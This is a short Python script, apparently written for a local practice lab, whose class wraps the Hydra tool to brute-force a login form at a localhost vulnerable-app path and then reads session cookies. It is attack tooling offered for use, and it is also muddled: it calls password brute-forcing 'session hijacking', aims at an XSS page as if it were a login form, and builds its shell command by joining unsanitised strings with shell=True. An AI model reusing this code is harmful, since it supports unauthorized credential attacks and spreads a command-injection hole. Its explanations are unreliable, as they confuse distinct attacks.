'''
This script contains a Python class dedicated to implementing session hijacking using Hydra. Brute-force attacks attempt to gain unauthorized access by systematically trying all possible passwords or keys until the valid one is found. Hydra is an advanced password-cracking tool that utilizes the brute-force attack method. The provided methods are part of a Python class, designed to work with the HTTP session established using Python's `requests.Session()`. The target URL for all brute-force activities in this script is http://127.0.0.1/vulnerabilities/xss_d/.
'''

import requests
import subprocess

class HydraSessionHijack:
    def __init__(self):
        self.target_url = "http://127.0.0.1/vulnerabilities/xss_d/"

    def initiate_hydra_attack(self, user_param, pass_param, user_file, pass_file):
        '''
        Initiate Hydra Brute-Force attack.
        :param user_param: GET/POST parameter name of username.
        :param pass_param: GET/POST parameter name of password.
        :param user_file: Path to the username wordlist.
        :param pass_file: Path to the password wordlist.
        '''
        # Example Hydra command: hydra -l <username> -P <password_file> <url_extension> http-post-form "<form>"
        command = [
            'hydra',
            f'-L {user_file}',
            f'-P {pass_file}',
            '127.0.0.1',
            f'http-post-form "/vulnerabilities/xss_d/:{user_param}=^USER^&{pass_param}=^PASS^:Error message displayed upon failure"'
        ]
        subprocess.run(' '.join(command), shell=True)

    def get_session_cookie(self):
        # Example code to send a request to a vulnerable endpoint and return session cookie.
        with requests.Session() as s:
            response = s.get(self.target_url)
            return s.cookies

def main():
    hijacker = HydraSessionHijack()
    # Example usage of the initiate_hydra_attack method:
    hijacker.initiate_hydra_attack("username", "password", "/path/to/username_file.txt", "/path/to/password_file.txt")

    # Example usage of the get_session_cookie method:
    session_cookie = hijacker.get_session_cookie()
    print(session_cookie)

if __name__ == '__main__':
    main()
